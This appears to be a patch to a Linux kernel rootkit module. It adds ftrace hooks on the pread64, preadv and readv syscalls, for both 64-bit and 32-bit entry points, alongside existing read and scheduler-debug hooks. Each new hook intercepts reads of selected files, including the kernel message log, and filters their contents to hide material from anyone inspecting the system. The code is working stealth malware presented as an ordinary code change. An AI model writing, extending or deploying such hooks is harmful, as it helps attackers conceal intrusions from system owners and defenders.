@@ -16,6 +16,12 @@ static const char *virtual_fs_types[] = {
 
 static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs);
 static asmlinkage ssize_t (*orig_read_ia32)(const struct pt_regs *regs);
+static asmlinkage ssize_t (*orig_pread64)(const struct pt_regs *regs);
+static asmlinkage ssize_t (*orig_pread64_ia32)(const struct pt_regs *regs);
+static asmlinkage ssize_t (*orig_preadv)(const struct pt_regs *regs);
+static asmlinkage ssize_t (*orig_preadv_ia32)(const struct pt_regs *regs);
+static asmlinkage ssize_t (*orig_readv)(const struct pt_regs *regs);
+static asmlinkage ssize_t (*orig_readv_ia32)(const struct pt_regs *regs);
 static int (*orig_sched_debug_show)(struct seq_file *m, void *v);
 
 notrace static bool should_filter_file(const char *filename) {
@@ -391,6 +397,326 @@ static notrace asmlinkage ssize_t hook_read_ia32(const struct pt_regs *regs) {
     return res;
 }
 
+static notrace asmlinkage ssize_t hook_pread64(const struct pt_regs *regs) {
+    if (!orig_pread64)
+        return -EINVAL;
+
+    int fd = regs->di;
+    char __user *user_buf = (char __user *)regs->si;
+    size_t count = (size_t)regs->dx;
+
+    if (!user_buf)
+        return -EFAULT;
+
+    struct file *file = fget(fd);
+    if (!file)
+        return orig_pread64(regs);
+
+    const char *filename = NULL;
+    if (file->f_path.dentry)
+        filename = file->f_path.dentry->d_name.name;
+
+    if (!should_filter_file(filename)) {
+        fput(file);
+        return orig_pread64(regs);
+    }
+
+    bool is_kmsg = is_kmsg_device(filename);
+    ssize_t res = 0;
+
+    if (is_kmsg) {
+        do {
+            res = orig_pread64(regs);
+            if (res <= 0)
+                break;
+            res = filter_kmsg_line(user_buf, res);
+        } while (res == 0);
+        fput(file);
+        return res;
+    }
+
+    res = read_and_filter(file, user_buf, count);
+    if (res == -EOPNOTSUPP) {
+        ssize_t orig_res = orig_pread64(regs);
+        if (orig_res <= 0) {
+            fput(file);
+            return orig_res;
+        }
+        res = filter_buffer_content(user_buf, orig_res);
+        fput(file);
+        return res;
+    }
+
+    fput(file);
+    return res;
+}
+
+static notrace asmlinkage ssize_t hook_pread64_ia32(const struct pt_regs *regs) {
+    if (!orig_pread64_ia32)
+        return -EINVAL;
+
+    int fd = regs->bx;
+    char __user *user_buf = (char __user *)regs->cx;
+    size_t count = (size_t)regs->dx;
+
+    if (!user_buf)
+        return -EFAULT;
+
+    struct file *file = fget(fd);
+    if (!file)
+        return orig_pread64_ia32(regs);
+
+    const char *filename = NULL;
+    if (file->f_path.dentry)
+        filename = file->f_path.dentry->d_name.name;
+
+    if (!should_filter_file(filename)) {
+        fput(file);
+        return orig_pread64_ia32(regs);
+    }
+
+    bool is_kmsg = is_kmsg_device(filename);
+    ssize_t res = 0;
+
+    if (is_kmsg) {
+        do {
+            res = orig_pread64_ia32(regs);
+            if (res <= 0)
+                break;
+            res = filter_kmsg_line(user_buf, res);
+        } while (res == 0);
+        fput(file);
+        return res;
+    }
+
+    res = read_and_filter(file, user_buf, count);
+    if (res == -EOPNOTSUPP) {
+        ssize_t orig_res = orig_pread64_ia32(regs);
+        if (orig_res <= 0) {
+            fput(file);
+            return orig_res;
+        }
+        res = filter_buffer_content(user_buf, orig_res);
+        fput(file);
+        return res;
+    }
+
+    fput(file);
+    return res;
+}
+
+static notrace asmlinkage ssize_t hook_preadv(const struct pt_regs *regs) {
+    if (!orig_preadv)
+        return -EINVAL;
+
+    int fd = regs->di;
+    struct iovec __user *iov = (struct iovec __user *)regs->si;
+    unsigned long vlen = regs->dx;
+
+    if (!iov || vlen == 0)
+        return -EFAULT;
+
+    struct file *file = fget(fd);
+    if (!file)
+        return orig_preadv(regs);
+
+    const char *filename = NULL;
+    if (file->f_path.dentry)
+        filename = file->f_path.dentry->d_name.name;
+
+    if (!should_filter_file(filename)) {
+        fput(file);
+        return orig_preadv(regs);
+    }
+
+    ssize_t orig_res = orig_preadv(regs);
+    if (orig_res <= 0) {
+        fput(file);
+        return orig_res;
+    }
+
+    bool is_kmsg = is_kmsg_device(filename);
+    if (is_kmsg) {
+        struct iovec iov_copy;
+        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
+            fput(file);
+            return orig_res;
+        }
+        ssize_t filtered = filter_kmsg_line(iov_copy.iov_base, orig_res);
+        fput(file);
+        return filtered;
+    }
+
+    struct iovec iov_copy;
+    if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
+        fput(file);
+        return orig_res;
+    }
+
+    ssize_t filtered = filter_buffer_content(iov_copy.iov_base, orig_res);
+    fput(file);
+    return filtered;
+}
+
+static notrace asmlinkage ssize_t hook_preadv_ia32(const struct pt_regs *regs) {
+    if (!orig_preadv_ia32)
+        return -EINVAL;
+
+    int fd = regs->bx;
+    struct iovec __user *iov = (struct iovec __user *)regs->cx;
+    unsigned long vlen = regs->dx;
+
+    if (!iov || vlen == 0)
+        return -EFAULT;
+
+    struct file *file = fget(fd);
+    if (!file)
+        return orig_preadv_ia32(regs);
+
+    const char *filename = NULL;
+    if (file->f_path.dentry)
+        filename = file->f_path.dentry->d_name.name;
+
+    if (!should_filter_file(filename)) {
+        fput(file);
+        return orig_preadv_ia32(regs);
+    }
+
+    ssize_t orig_res = orig_preadv_ia32(regs);
+    if (orig_res <= 0) {
+        fput(file);
+        return orig_res;
+    }
+
+    bool is_kmsg = is_kmsg_device(filename);
+    if (is_kmsg) {
+        struct iovec iov_copy;
+        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
+            fput(file);
+            return orig_res;
+        }
+        ssize_t filtered = filter_kmsg_line(iov_copy.iov_base, orig_res);
+        fput(file);
+        return filtered;
+    }
+
+    struct iovec iov_copy;
+    if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
+        fput(file);
+        return orig_res;
+    }
+
+    ssize_t filtered = filter_buffer_content(iov_copy.iov_base, orig_res);
+    fput(file);
+    return filtered;
+}
+
+static notrace asmlinkage ssize_t hook_readv(const struct pt_regs *regs) {
+    if (!orig_readv)
+        return -EINVAL;
+
+    int fd = regs->di;
+    struct iovec __user *iov = (struct iovec __user *)regs->si;
+    unsigned long vlen = regs->dx;
+
+    if (!iov || vlen == 0)
+        return -EFAULT;
+
+    struct file *file = fget(fd);
+    if (!file)
+        return orig_readv(regs);
+
+    const char *filename = NULL;
+    if (file->f_path.dentry)
+        filename = file->f_path.dentry->d_name.name;
+
+    if (!should_filter_file(filename)) {
+        fput(file);
+        return orig_readv(regs);
+    }
+
+    ssize_t orig_res = orig_readv(regs);
+    if (orig_res <= 0) {
+        fput(file);
+        return orig_res;
+    }
+
+    bool is_kmsg = is_kmsg_device(filename);
+    if (is_kmsg) {
+        struct iovec iov_copy;
+        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
+            fput(file);
+            return orig_res;
+        }
+        ssize_t filtered = filter_kmsg_line(iov_copy.iov_base, orig_res);
+        fput(file);
+        return filtered;
+    }
+
+    struct iovec iov_copy;
+    if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
+        fput(file);
+        return orig_res;
+    }
+
+    ssize_t filtered = filter_buffer_content(iov_copy.iov_base, orig_res);
+    fput(file);
+    return filtered;
+}
+
+static notrace asmlinkage ssize_t hook_readv_ia32(const struct pt_regs *regs) {
+    if (!orig_readv_ia32)
+        return -EINVAL;
+
+    int fd = regs->bx;
+    struct iovec __user *iov = (struct iovec __user *)regs->cx;
+    unsigned long vlen = regs->dx;
+
+    if (!iov || vlen == 0)
+        return -EFAULT;
+
+    struct file *file = fget(fd);
+    if (!file)
+        return orig_readv_ia32(regs);
+
+    const char *filename = NULL;
+    if (file->f_path.dentry)
+        filename = file->f_path.dentry->d_name.name;
+
+    if (!should_filter_file(filename)) {
+        fput(file);
+        return orig_readv_ia32(regs);
+    }
+
+    ssize_t orig_res = orig_readv_ia32(regs);
+    if (orig_res <= 0) {
+        fput(file);
+        return orig_res;
+    }
+
+    bool is_kmsg = is_kmsg_device(filename);
+    if (is_kmsg) {
+        struct iovec iov_copy;
+        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
+            fput(file);
+            return orig_res;
+        }
+        ssize_t filtered = filter_kmsg_line(iov_copy.iov_base, orig_res);
+        fput(file);
+        return filtered;
+    }
+
+    struct iovec iov_copy;
+    if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
+        fput(file);
+        return orig_res;
+    }
+
+    ssize_t filtered = filter_buffer_content(iov_copy.iov_base, orig_res);
+    fput(file);
+    return filtered;
+}
+
 static notrace int hook_sched_debug_show(struct seq_file *m, void *v) {
     if (!orig_sched_debug_show || !m)
         return -EINVAL;
@@ -427,6 +753,12 @@ static notrace int hook_sched_debug_show(struct seq_file *m, void *v) {
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_read", hook_read, &orig_read),
     HOOK("__ia32_sys_read", hook_read_ia32, &orig_read_ia32),
+    HOOK("__x64_sys_pread64", hook_pread64, &orig_pread64),
+    HOOK("__ia32_sys_pread64", hook_pread64_ia32, &orig_pread64_ia32),
+    HOOK("__x64_sys_readv", hook_readv, &orig_readv),
+    HOOK("__ia32_sys_readv", hook_readv_ia32, &orig_readv_ia32),
+    HOOK("__x64_sys_preadv", hook_preadv, &orig_preadv),
+    HOOK("__ia32_sys_preadv", hook_preadv_ia32, &orig_preadv_ia32),
     HOOK("sched_debug_show", hook_sched_debug_show, &orig_sched_debug_show),
 };
 
